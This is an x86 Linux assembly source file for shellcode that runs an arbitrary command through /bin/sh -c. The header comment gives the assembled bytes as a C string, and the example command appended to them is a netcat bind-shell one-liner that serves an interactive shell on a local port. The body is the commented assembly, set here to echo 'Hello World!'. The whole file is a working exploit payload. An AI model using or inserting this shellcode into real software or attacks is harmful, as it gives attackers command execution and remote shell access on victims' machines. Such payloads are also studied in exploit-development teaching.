# char shellcode[] =
# "\x31\xc0\x66\xb8\x2d\x63\x50\x89\xe7\x99\x52\xeb\x2f\x8b\x34\x24\xeb\x01\x46\x80\x3e\x23\x75\xfa\x88\x16\x57\x83\xec\x04\x8d\x5c\x24\xf8\x89\x1c\x24\x89\xe1\x68\x2f\x73\x68\xff\x88\x54\x24\x03\x68\x2f\x62\x69\x6e\x66\x31\xc0\xb0\x0b\xcd\x80\xe8\xcc\xff\xff\xff\
# rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f; rm -f /tmp/f";

# Length of the prefixing shellcode: 55 bytes (+ the null terminating char in the custom cmd)

	.set END, 0x23		# terminating char (e.g, '#')
.text
.globl _start
_start:
	xorl %eax, %eax
	mov $0x632d, %ax	# -c
	pushl %eax
	movl %esp, %edi		# address of "-c"

	cdq			# %edx = 0 = NULL
	push %edx		# NULL terminator of argv[]

	jmp cmd
	back:
	movl (%esp), %esi	# address of cmd

	jmp test
	loop:
	inc %esi
	test:
	cmpb $END, (%esi)
	jne loop
	movb %dl, (%esi)

	pushl %edi		# address of "-c"

	sub $4, %esp		# will contain
	lea -0x8(%esp), %ebx	# address of "/bin/sh"
	movl %ebx, (%esp)	# progname (syscall)
	movl %esp, %ecx		# argv

	pushl $0xff68732f	# /sh
	movb %dl, 0x3(%esp)	# '\0' terminator
	pushl $0x6e69622f	# /bin

	xor %ax, %ax
	movb $0xb, %al

	int $0x80
cmd:
	call back
	.ascii "echo Hello World!#"


